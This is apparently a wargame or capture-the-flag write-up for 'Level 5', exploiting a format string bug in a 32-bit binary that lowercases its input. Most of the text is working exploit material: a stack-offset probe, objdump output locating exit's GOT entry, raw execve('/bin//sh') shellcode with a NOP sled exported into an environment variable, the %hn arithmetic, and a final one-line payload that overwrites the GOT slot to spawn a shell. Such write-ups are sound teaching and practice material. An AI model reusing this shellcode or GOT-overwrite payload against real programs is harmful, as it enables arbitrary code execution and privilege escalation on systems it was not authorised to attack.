# Level 5

## the code

the program reads 100 chars on stdin and stores them in a size 100 buffer.
Upercases are then converted to lowercases and the result printed with
an unsecure printf(s). A call to exit follows.

## idee:

replace exit by our shellcode in the Global Offset Table. We have to be carefull not having values between 64 and 90 in our injection code. We can't then put directly our shellcode in the string. We will therefore put it
in a env variable and make the GOT address points to it.

### printf args offset

```sh
$ python -c 'print "AAAA" + ".%08x" * 12' | ./level05
aaaa.00000064.f7fcfac0.f7ec3add.ffffd69f.ffffd69e.00000000.ffffffff.ffffd724.f7fdb000.61616161.3830252e.30252e78
```

'a' is 0x61 and the offset is 10.

### exit GOT address

```sh
$ objdump -R ./level05

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

exit address stored at 08 04 97 e0 (no values between 64 (\x41) and 90 (\x5a))
cut in two addresses: 080497e0 and 080497e2

### shellcode in an env variable

```sh
$ cd /tmp
$ vim gev.c
$ gcc -m32 gev.c
$ export OPLA=`python -c 'print("\x90" * 50 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
$ ./a.out
OPLA will be near 0xffffdecf
```

to reach the middle of the slope we add 24

| format |  low  |   high |
| :----: | :---: | -----: |
|  hex   | decf  |   ffff |
|  dec   | 57039 |  65535 |
| slope  | + 24  |     -- |
|  dec   | 57063 |  65535 |
| offset |  -8   | -57063 |
| magic  | 57055 |   8472 |

## the hack
```sh
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57055x%10$hn" + "%8472x%11$hn")' ; cat) | ./level05
```
